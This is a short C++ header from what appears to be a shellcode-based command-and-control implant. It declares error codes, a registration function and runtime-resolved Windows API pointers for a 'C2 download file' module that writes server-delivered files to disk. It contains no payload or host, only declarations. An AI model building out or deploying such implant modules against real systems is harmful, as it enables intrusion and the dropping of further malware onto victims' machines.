#include "shellcode.hpp"

#define CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_MALLOC_STRUCT          0x1001
#define CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_GET_POINTERS           0x1002
#define CUSTOM_MODULE_C2_DOWNLOADFILE_FAIL_REGISTER_MODULE        0x1003
#define ERROR_GET_POINTER_CUSTOM_MODULE_CREATEFILEA               0x1004
#define ERROR_GET_POINTER_CUSTOM_MODULE_WRITEFILEA                0x1005
#define ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE               0x1006
#define ERROR_GET_POINTER_CUSTOM_MODULE_EXPANDENVIRONMENTSTRINGSA 0x1007

DWORD RegisterModule_C2DownloadFile(sh_context* ctx, uint32_t module_id);

using CreateFileA_t = decltype(&CreateFileA);
using WriteFile_t = decltype(&WriteFile);
using CloseHandle_t = decltype(&CloseHandle);
using ExpandEnvironmentStringsA_t = decltype(&ExpandEnvironmentStringsA);

struct download_pointers {
    CreateFileA_t fp_CreateFileA;
    WriteFile_t fp_WriteFile;
    CloseHandle_t fp_CloseHandle;
    ExpandEnvironmentStringsA_t fp_ExpandEnvironmentStringsA;
};
